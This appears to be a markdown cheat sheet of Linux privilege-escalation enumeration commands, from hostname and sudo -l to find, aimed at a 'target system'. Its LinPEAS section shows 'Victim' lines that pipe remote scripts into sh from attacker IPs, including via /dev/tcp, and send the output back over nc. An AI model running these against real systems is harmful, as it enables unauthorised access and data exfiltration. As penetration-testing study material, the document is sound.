# Table of content

- [Table of content](#table-of-content)
- [return to index](INDEX.md)
  - [manual](#manual)
    - [hostname](#hostname)
    - [uname](#uname)
    - [version](#version)
    - [issue](#issue)
    - [ps](#ps)
    - [env](#env)
    - [sudo](#sudo)
    - [ls](#ls)
    - [id](#id)
    - [passwd](#passwd)
    - [history](#history)
    - [ifconfig](#ifconfig)
    - [netstat](#netstat)
    - [find](#find)
  - [automated-tools](#automated-tools)
    - [LinPeas](#linpeas)
    - [LES (Linux Exploit Suggester)](#les-linux-exploit-suggester)
    - [LSE (Linux Smart Enumeration)](#lse-linux-smart-enumeration)
    - [LPC (Linux Priv Checker)](#lpc-linux-priv-checker)

## manual

### hostname

```bash
    hostname
```

The hostname command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

### uname

```bash
    uname -a
```

Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

### version

```bash
    cat /proc/version
```

The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.

### issue

```bash
    cat /etc/issue
```

Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system but can easily be customized or changes. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

### ps

View all running processes:

```bash
    ps -A
```

View process tree:

```bash
    ps axjf
```

Show processes for all users:

```bash
    ps aux
```

The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.

The output of the ps (Process Status) will show the following:

- PID: The process ID (unique to the process)
- TTY: Terminal type used by the user
- Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
- CMD: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.

### env

```bash
    env
```

The env command will show environmental variables.

### sudo

```bash
    sudo -l
```

The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.

### ls

list all files of a directorie

```bash
    ls
```

show number of files contains a directorie

```bash
    ls -l
```

show hiddens files of a directorie

```bash
    ls -al
```

### id

```bash
    id
```

The id command will provide a general overview of the user’s privilege level and group memberships.

It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.

### passwd

```bash
    cat /etc/passwd
```

```bash
    cat /etc/passwd | cut -d : -f 1
```

Reading the /etc/passwd file can be an easy way to discover users on the system.

### history

```bash
    history
```

Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

### ifconfig

```bash
    ifconfig
```

```bash
    ip route
```

The target system may be a pivoting point to another network. The ifconfig command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks.

### netstat

Shows all listening ports and established connections.

```bash
    netstat -a
```

List TCP or UDP protocols.

```bash
    netstat -at
```

```bash
    netstat -au
```

list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below).

```bash
    netstat -l
```

list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol.

```bash
    netstat -s
```

list connections with the service name and PID information.

```bash
    netstat -tp
```

Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

```bash
    netstat -i
```

The netstat usage you will probably see most often in blog posts, write-ups, and courses is netstat -ano which could be broken down as follows;

- a: Display all sockets
- n: Do not resolve names
- o: Display timers

```bash
    netstat -ano
```

### find

Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.

```bash
   find . -name flag1.txt #find the file named “flag1.txt” in the current directory
   find /home -name flag1.txt #find the file names “flag1.txt” in the /home directory
   find / -type d -name config #find the directory named config under “/”
   find / -type f -perm 0777 #find files with the 777 permissions (files readable, writable, and executable by all users)
   find / -perm a= #find executable files
   find /home -user frank #find all files for user “frank” under “/home”
   find / -mtime 10 #find files that were modified in the last 10 days
   find / -atime 10 #find files that were accessed in the last 10 day
   find / -cmin -60 #find files changed within th   e last hour (60 minutes)
   find / -amin -60 #find files accesses within the last hour (60 minutes)
   find / -size 50M #find files with a 50 MB size
```

## automated-tools

### LinPeas

with network:

```bash
    # From github
    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

local:

```bash
    # Local network
    sudo python -m SimpleHTTPServer 80 #Host
    curl 10.10.10.10/linpeas.sh | sh #Victim

    # Without curl
    sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
    cat < /dev/tcp/10.10.10.10/80 | sh #Victim

    # Excute from memory and send output back to the host
    nc -lvnp 9002 | tee linpeas.out #Host
    curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

[Linpeas github](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

### LES (Linux Exploit Suggester)

```bash
    wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

[LES github](https://github.com/mzet-/linux-exploit-suggester)

### LSE (Linux Smart Enumeration)

```bash
    wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
```

[LSE](https://github.com/diego-treitos/linux-smart-enumeration)

### LPC (Linux Priv Checker)

```bash
    wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
```

[LPC github](https://github.com/sleventyeleven/linuxprivchecker)
